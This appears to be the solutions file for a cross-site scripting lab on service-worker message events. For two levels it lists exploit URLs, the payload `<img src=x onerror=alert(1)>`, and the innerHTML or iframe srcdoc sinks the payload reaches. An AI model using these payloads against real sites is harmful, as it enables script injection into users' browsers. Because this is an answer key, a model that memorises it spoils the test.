# service-worker — solutions

Synthetic ServiceWorker `message` event dispatched with the seed value as `event.data`; sinks innerHTML or iframe srcdoc.

### service-worker-level1

`/service-worker/level1/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `event.data` -> `output.innerHTML`

### service-worker-level2

`/service-worker/level2/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: JSON-wrapped seed -> `data.html` -> iframe srcdoc
